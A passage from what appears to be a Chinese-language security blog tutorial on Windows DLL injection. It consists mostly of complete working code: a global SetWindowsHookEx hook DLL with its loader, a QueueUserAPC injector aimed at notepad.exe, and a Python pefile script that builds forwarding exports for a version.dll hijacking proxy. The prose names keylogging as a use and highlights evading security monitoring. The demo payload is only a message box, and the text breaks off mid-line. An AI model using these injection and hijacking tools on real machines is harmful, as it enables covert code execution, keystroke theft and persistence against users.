class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GlobalHookDll.c</span></span><br><span class="line"><span class="comment">// 编译命令: gcc -shared -o GlobalHookDll.dll GlobalHookDll.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 宏定义：方便导出函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLLEXPORT __declspec(dllexport)</span></span><br><span class="line"><span class="comment">// 全局变量保存句柄和实例</span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE g_hInst = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 1. 钩子回调函数 (业务逻辑)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">MyHookProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    <span class="comment">// 只有当nCode &gt;= 0时才处理消息</span></span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 为了演示，我们只在记事本里弹窗 (防止系统卡死)</span></span><br><span class="line">        <span class="type">char</span> path[MAX_PATH];</span><br><span class="line">        GetModuleFileNameA(<span class="literal">NULL</span>, path, MAX_PATH);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(path, <span class="string">&quot;notepad.exe&quot;</span>) || <span class="built_in">strstr</span>(path, <span class="string">&quot;Notepad.exe&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 简单的防重入标志，防止一个消息弹无数次窗</span></span><br><span class="line">            <span class="type">static</span> <span class="type">int</span> hasPopped = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (hasPopped == <span class="number">0</span>) &#123;</span><br><span class="line">                MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Exploooosion!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">                hasPopped = <span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 必须调用下一个钩子 [cite: 6]</span></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 2. 导出函数：安装钩子 (参考附件 StartHook)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">DLLEXPORT <span class="type">void</span> <span class="title function_">StartHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 在这里调用 API，而不是在 EXE 里</span></span><br><span class="line">        <span class="comment">// 参数 3 使用 g_hInst，这是 DllMain 获取到的自身模块句柄</span></span><br><span class="line">        <span class="comment">// 参数 4 填 0，代表全局注入 [cite: 7]</span></span><br><span class="line">        g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MyHookProc, g_hInst, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Hook installed successfully.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Failed to install hook. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 3. 导出函数：卸载钩子 (参考附件 StopHook)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">DLLEXPORT <span class="type">void</span> <span class="title function_">StopHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(g_hHook);</span><br><span class="line">        g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Hook removed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 4. DllMain：获取自身句柄</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// 保存 DLL 自身的实例句柄，StartHook 需要用到它 [cite: 9]</span></span><br><span class="line">        g_hInst = hinstDLL; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hookinjection.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HookLoader.c</span></span><br><span class="line"><span class="comment">// 编译命令: gcc -o HookLoader.exe HookLoader.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 定义函数指针类型，方便调用 DLL 里的函数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_StartHook)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_StopHook)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_StartHook StartHook = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_StopHook StopHook = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 1. 加载 DLL</span></span><br><span class="line">    hDll = LoadLibraryA(<span class="string">&quot;GlobalHookDll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load DLL.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取 DLL 中导出的 StartHook 和 StopHook 函数地址</span></span><br><span class="line">    StartHook = (PFN_StartHook)GetProcAddress(hDll, <span class="string">&quot;StartHook&quot;</span>);</span><br><span class="line">    StopHook  = (PFN_StopHook)GetProcAddress(hDll, <span class="string">&quot;StopHook&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!StartHook || !StopHook) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find exported functions.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 启动钩子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Loader] Calling StartHook()...\n&quot;</span>);</span><br><span class="line">    StartHook(); <span class="comment">// 直接调用 DLL 内部的逻辑</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Hook is running globally.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Press ENTER to stop the hook and exit...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 4. 阻塞主线程</span></span><br><span class="line">    <span class="comment">// 再次强调：Loader 必须活着，因为钩子是挂在这个进程名下的。</span></span><br><span class="line">    <span class="comment">// 如果 Loader 退出，StartHook 安装的钩子会被系统强制注销。</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">// 5. 卸载钩子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Loader] Calling StopHook()...\n&quot;</span>);</span><br><span class="line">    StopHook();</span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-1"><a href="#攻击效果-1" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li><strong>键盘记录 (Keylogger)</strong> ：通过 <code>WH_KEYBOARD</code> 钩子记录所有程序的键盘输入。</li><li><strong>隐蔽执行</strong> ：不需要创建新线程，代码在目标进程的主 UI 线程中执行。</li></ul><p><img src="/image/2025-12-12-windows_dll_injection/1765605236779.png" alt="1765605236779"></p><p><img src="/image/2025-12-12-windows_dll_injection/1765605309784.png" alt="1765605309784"></p><h3 id="APC-注入-QueueUserAPC"><a href="#APC-注入-QueueUserAPC" class="headerlink" title="APC 注入 (QueueUserAPC)"></a>APC 注入 (QueueUserAPC)</h3><p>利用线程异步过程调用队列的“隐蔽”注入技术。</p><h4 id="技术原理-4"><a href="#技术原理-4" class="headerlink" title="技术原理"></a>技术原理</h4><p>每个线程都有一个 APC（Asynchronous Procedure Call）队列。操作系统允许一个进程向另一个进程的线程队列中插入一个函数调用。当该目标线程进入“可警醒状态”（Alertable State，例如调用 <code>SleepEx</code>）时，它会优先执行队列中的函数。</p><h4 id="实现方法与流程-参考-ApcInjector-c"><a href="#实现方法与流程-参考-ApcInjector-c" class="headerlink" title="实现方法与流程 (参考 ApcInjector.c)"></a>实现方法与流程 (参考 <code>ApcInjector.c</code>)</h4><ol><li><strong>准备环境</strong> ：打开目标进程，分配内存，写入 DLL 路径（同 CreateRemoteThread）。</li><li><strong>枚举线程</strong> ：获取目标进程的所有线程 ID（因为 APC 是针对线程的）。</li><li><strong>插入请求</strong> ：遍历每一个线程，调用 <code>QueueUserAPC</code> 将 <code>LoadLibrary</code> 插入队列。</li><li><strong>等待触发</strong> ：攻击者无法主动触发，只能等待目标线程自行进入可警醒状态。</li></ol><h4 id="核心-API-及作用-3"><a href="#核心-API-及作用-3" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, ...)</code>：拍摄系统快照，用于枚举所有线程。</li><li><code>Thread32First</code> &#x2F; <code>Thread32Next</code>：遍历查找属于目标 PID 的线程 ID。</li><li><code>OpenThread(THREAD_SET_CONTEXT, ...)</code>：获取目标线程句柄，必须拥有设置上下文的权限。</li><li><code>QueueUserAPC(pLoadLibrary, hThread, pRemoteMem)</code>： <strong>核心触发点</strong> 。将 <code>LoadLibrary</code> 函数排队到目标线程的执行计划中。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 编译命令: gcc -o ApcInjector.exe ApcInjector.c</span></span><br><span class="line"><span class="comment">// 确保 injector.h 在同级目录</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="comment">// 使用 GetFullPathNameW</span></span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDll.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// =======================================</span></span><br><span class="line">    <span class="comment">// 1. 获取目标进程 PID</span></span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Target process not found: %ls\n&quot;</span>, targetProcessName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="comment">// 2. 尝试提权 (如果是注入系统进程则必须，普通进程可选)</span></span><br><span class="line">    <span class="keyword">if</span> (EnableDebugPrivilege()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] SeDebugPrivilege enabled.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 打开目标进程</span></span><br><span class="line">    <span class="comment">// 需要 PROCESS_ALL_ACCESS 或至少 VM_WRITE/VM_OPERATION 权限 [cite: 29]</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 在目标进程分配内存</span></span><br><span class="line">    <span class="type">size_t</span> pathSize = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathSize, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// [cite: 30]</span></span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathSize, <span class="literal">NULL</span>)) &#123; <span class="comment">// [cite: 31]</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DLL path written to remote memory.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 获取 LoadLibraryW 地址</span></span><br><span class="line">    <span class="comment">// Kernel32.dll 在所有进程中的基址通常相同，所以直接取本地地址即可 [cite: 32]</span></span><br><span class="line">    PTHREAD_START_ROUTINE pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pLoadLibrary) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get LoadLibraryW address.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 7. 获取目标进程的所有线程</span></span><br><span class="line">    DWORD* pThreadIds = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD threadCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!GetProcessThreadList(pid, &amp;pThreadIds, &amp;threadCount)) &#123; <span class="comment">// 使用 injector.h 中的函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to enumerate threads.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Enumerated %lu threads in target process.\n&quot;</span>, threadCount);</span><br><span class="line">    <span class="comment">// 8. 遍历线程并插入 APC</span></span><br><span class="line">    <span class="type">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; threadCount; i++) &#123;</span><br><span class="line">        <span class="comment">// 打开线程，必须拥有 THREAD_SET_CONTEXT 访问权限才能通过 QueueUserAPC 注入 </span></span><br><span class="line">        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, pThreadIds[i]); <span class="comment">// [cite: 36]</span></span><br><span class="line">        <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">            <span class="comment">// 核心函数：QueueUserAPC </span></span><br><span class="line">            <span class="comment">// 参数1: 要执行的函数 (LoadLibraryW)</span></span><br><span class="line">            <span class="comment">// 参数2: 目标线程句柄</span></span><br><span class="line">            <span class="comment">// 参数3: 传递给函数的参数 (远程内存中的 DLL 路径)</span></span><br><span class="line">            <span class="keyword">if</span> (QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteMem)) &#123; <span class="comment">// [cite: 37]</span></span><br><span class="line">                successCount++;</span><br><span class="line">                <span class="comment">// printf(&quot;[+] APC queued for Thread ID: %lu\n&quot;, pThreadIds[i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully queued APC to %d threads.\n&quot;</span>, successCount);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Waiting for target threads to enter &#x27;Alertable State&#x27; (e.g. SleepEx) to trigger execution...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    <span class="keyword">if</span> (pThreadIds) VirtualFree(pThreadIds, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="comment">// 注意：不要过早 VirtualFreeEx pRemoteMem，因为目标线程可能还没执行 APC。</span></span><br><span class="line">    <span class="comment">// 在实际恶意软件中，通常就不释放了，或者等待很长时间。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-2"><a href="#攻击效果-2" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li><strong>高隐蔽性 (Stealth)</strong> ： <strong>不创建新线程</strong> 。大多数安全软件会监控 <code>CreateRemoteThread</code>，但对 <code>QueueUserAPC</code> 的监控相对较少。代码复用目标进程现有的线程执行。</li><li><strong>局限性</strong> ：依赖于目标进程的行为（必须调用 <code>SleepEx</code> 等函数），如果目标线程太忙或不进入可警醒状态，注入可能永远不会触发。</li></ul><p><img src="/image/2025-12-12-windows_dll_injection/1765616757981.png" alt="1765616757981"></p><h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>在Windows系统中运行可执行文件时，系统会调用相应需要的.dll文件，系统的默认优先级规则是最优先调用是当前目录下的.dll链接库，寻找不到则去系统目录下寻找。或者程序会动态生成目录然后使用loadlibrary去动态调用。</p><p>如果程序没有使用SetDllDirectory()函数设定dll加载绝对路径，则程序很大可能性即存在dll劫持注入漏洞。</p><h3 id="dll搜索顺序"><a href="#dll搜索顺序" class="headerlink" title="dll搜索顺序"></a>dll搜索顺序</h3><p>dll的搜索顺序一直在变化，包括使用一些安全手段来改变搜索顺序。一般的顺序如下</p><ol><li>应用程序加载的目录</li><li>系统目录，使用 GetSystemDirectory 获取该路径</li><li>16 位系统目录</li><li>Windows 目录，使用 GetWindowsDirectory 获取该路径</li><li>当前目录</li><li>PATH 环境变量中列出的目录</li></ol><p>如果要加载的 dll 模块属于 Known DLLs，系统直接加载系统目录下的该 dll，不会进行搜索。</p><p>Known DLLs 列表：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p><p><img src="/image/2025-12-12-windows_dll_injection/1765687938486.png" alt="1765687938486"></p><h3 id="实现方法-1"><a href="#实现方法-1" class="headerlink" title="实现方法"></a>实现方法</h3><p>恶意dll无法做到完全复刻原本的dll的所有函数功能，只能通过函数转发的方式</p><p><img src="/image/2025-12-12-windows_dll_injection/1765844966874.png" alt="1765844966874"></p><p>使用Python 脚本（配合 <code>pefile</code> 库）把原 DLL 所有的函数名（如 <code>malloc</code>, <code>printf</code>, <code>free</code>…）和序号全部读出来，自动按照链接器的语法格式，生成 <code>.def</code> 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target_dll = <span class="string">&quot;version.dll&quot;</span></span><br><span class="line">proxy_dll = <span class="string">&quot;old&quot;</span> + target_dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 检查并重命名原文件</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(target_dll):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Renaming <span class="subst">&#123;target_dll&#125;</span> -&gt; <span class="subst">&#123;proxy_dll&#125;</span>&quot;</span>)</span><br><span class="line">    os.rename(target_dll, proxy_dll)</span><br><span class="line"><span class="keyword">elif</span> os.path.exists(proxy_dll):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;target_dll&#125;</span> already renamed to <span class="subst">&#123;proxy_dll&#125;</span>, skipping rename.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: Could not find <span class="subst">&#123;target_dll&#125;</span> or <span class="subst">&#123;proxy_dll&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 解析 DLL</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pe = pefile.PE(proxy_dll)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] PE Parse Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def_file = target_dll.replace(<span class="string">&quot;.dll&quot;</span>, <span class="string">&quot;.def&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Generating <span class="subst">&#123;def_file&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">forward_module = proxy_dll.replace(<span class="string">&quot;.dll&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(def_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">f&#x27;LIBRARY <span class="subst">&#123;target_dll&#125;</span>\nEXPORTS\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(pe, <span class="string">&#x27;DIRECTORY_ENTRY_EXPORT&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> export <span class="keyword">in</span> pe.DIRECTORY_ENTRY_EXPORT.symbols:</span><br><span class="line">            <span class="keyword">if</span> export.name:</span><br><span class="line">                func_name = export.name.decode()</span><br><span class="line">                <span class="comment"># 格式: 导出函数名 = 转发模块.原函数名 @序号</span></span><br><span class="line">                line = <span class="string">f&quot;<span class="subst">&#123;func_name&#125;</span>=<span class="subst">&#123;forward_module&#125;</span>.<span class="subst">&#123;func_name&#125;</span>\t@<span class="subst">&#123;export.ordinal&#125;</span>&quot;</span></span><br><span class="line">                file.write(<span class="string">&quot;\t&quot;</span> + line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No export table found!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Done! Generated <span class="subst">&#123;count&#125;</span> exports.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 